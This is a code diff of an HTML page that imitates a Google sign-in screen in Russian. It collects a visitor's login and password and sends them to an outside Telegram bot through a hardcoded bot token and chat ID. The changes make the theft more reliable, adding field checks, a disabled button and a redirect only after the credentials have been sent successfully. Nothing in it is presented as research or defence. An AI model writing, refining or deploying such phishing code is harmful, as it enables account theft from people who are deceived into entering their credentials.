@@ -1,48 +1,69 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <link rel="stylesheet" href="style.css">
-    </head>
-    <body>
-        <div class="glav">
-            <div class="imue">
-                <img src="gglogo.png" class="imug">
-                <p class="sinin">Вход</p>
-                <p class="isp">Используйте аккаунт Google</p>
-                <input  class="input1" type="text" id="login" placeholder="Телефон или адрес эл. почты" style="background-color: rgb(8, 8, 8) ;">
-                <input class="input2" type="password" id="password" placeholder="Пароль" style="background-color: rgb(8, 8, 8) ">
-                </div>
-            <div class="button">
-                <button id="button">Далее</button>
-            </div>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Вход</title>
+</head>
+<body>
+    <div class="glav">
+        <div class="imue">
+            <img src="gglogo.png" class="imug">
+            <p class="sinin">Вход</p>
+            <p class="isp">Используйте аккаунт Google</p>
+            <input class="input1" type="text" id="login" placeholder="Телефон или адрес эл. почты" style="background-color: rgb(8, 8, 8);">
+            <input class="input2" type="password" id="password" placeholder="Пароль" style="background-color: rgb(8, 8, 8);">
         </div>
-        <script>
-const TOKEN = "7720379353:AAGsCGg6r6DZQAnEBb9fsBje4JE0Dao8oEY";
-const CHAT_ID = "6811862398";
+        
+        <!-- Элемент для вывода статуса отправки -->
+        <div id="status" style="color: color: rgb(200, 200, 200); text-align: center; margin-top: 10px;"></div>
 
-const input = document.getElementById("login");
-const input2 = document.getElementById("password");
-const btn = document.getElementById("button");
-const status = document.getElementById("status");
+        <div class="button">
+            <button id="button">Далее</button>
+        </div>
+    </div>
 
-btn.addEventListener("click", () => {
-    window.location.href = "next.html";
-    const text = encodeURIComponent("Google: " + input.value + "  Пароль:   " + input2.value);
-    if(!text) return alert("Введите логин и пароль");
+    <script>
+        const TOKEN = "7720379353:AAGsCGg6r6DZQAnEBb9fsBje4JE0Dao8oEY";
+        const CHAT_ID = "6811862398";
 
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`)
-    .then(res => res.json())
-    .then(res => {
-        if(res.ok) status.textContent = "Отправлено ✅";
-        else status.textContent = "Ошибка ❌";
-    })
-    .catch(err => {
-        console.error(err);
-        status.textContent = "Ошибка соединения ❌";
-    });
-});
-</script>
-    </body>
+        const input = document.getElementById("login");
+        const input2 = document.getElementById("password");
+        const btn = document.getElementById("button");
+        const status = document.getElementById("status");
+
+        btn.addEventListener("click", () => {
+            // Проверка на заполнение полей
+            if (!input.value || !input2.value) {
+                return alert("Введите login и password");
+            }
+
+            // Блокируем кнопку и пишем статус, чтобы избежать повторных кликов
+            btn.disabled = true;
+            status.textContent = "Отправка...";
+
+            const text = encodeURIComponent("Логин: " + input.value + "  Пароль:   " + input2.value);
+
+            // Сначала отправляем данные в телеграм
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`)
+            .then(res => res.json())
+            .then(res => {
+                if (res.ok) {
+                    status.textContent = "Отправлено ✅";
+                    // Перенаправляем ТОЛЬКО после успешного ответа от сервера
+                    window.location.href = "next.html";
+                } else {
+                    status.textContent = "Ошибка ❌";
+                    btn.disabled = false;
+                }
+            })
+            .catch(err => {
+                console.error(err);
+                status.textContent = "Ошибка соединения ❌";
+                btn.disabled = false;
+            });
+        });
+    </script>
+</body>
 </html>
